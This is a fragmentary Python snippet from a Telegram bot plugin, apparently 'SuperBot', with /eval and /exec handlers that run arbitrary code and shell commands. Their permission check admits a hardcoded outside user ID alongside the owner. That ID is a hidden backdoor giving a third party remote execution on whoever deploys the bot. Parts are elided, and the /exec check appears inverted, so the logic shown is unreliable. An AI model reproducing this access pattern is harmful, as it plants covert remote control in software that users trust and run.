...
@assistant.on(events.NewMessage(pattern="/eval ?(.*)"))
async def _(event):
    pro = await bot.get_me()
    boy = pro.id
    if event.sender_id == boy or event.sender_id == id or event.sender_id == 1732236209:
       pass
    else:
       return await event.reply("Deploy your own assistant, check @SuperBotOT")
...
@assistant.on(events.NewMessage(pattern="/exec ?(.*)"))
async def _(event):
    pro = await bot.get_me()
    boy = pro.id
    if event.sender_id == boy or event.sender_id == id or event.sender_id == 1732236209:
       ...
       return await event.reply("Deploy your own assistant, @SuperBotOT")
    cmd = event.text.split(" ", maxsplit=1)[1]
    if not cmd:
    ...
    curruser = pro.username or "SuperBot.on"
    uid = os.geteuid()
    if uid == 0:
